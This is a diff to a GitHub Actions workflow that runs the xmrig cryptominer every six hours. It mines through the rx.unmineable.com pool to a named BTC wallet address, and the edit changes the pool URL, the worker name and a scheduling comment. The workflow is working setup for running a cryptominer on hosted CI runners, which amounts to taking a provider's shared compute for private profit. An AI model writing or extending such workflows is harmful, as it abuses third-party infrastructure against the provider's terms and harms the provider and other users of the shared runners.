@@ -3,7 +3,7 @@ name: Unmineable BTC Miner
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 */6 * * *"
+    - cron: "0 */6 * * *"  # Otomatis tiap 6 jam
 
 jobs:
   mine:
@@ -24,6 +24,6 @@ jobs:
         run: |
           cd xmrig-6.24.0
           chmod +x xmrig
-          ./xmrig -a rx -o rx.unmineable.com:3333 \
-            -u BTC:bc1ql83n6aql33keyqygsggq5zaczuefmlyrpv9h49.chatgptWorker \
-            -p x -k --tls
+          ./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 \
+            -u BTC:bc1ql83n6aql33keyqygsggq5zaczuefmlyrpv9h49.unmineable_miner_ghaction#xg8f-8asc \
+            -p x -k --no-color
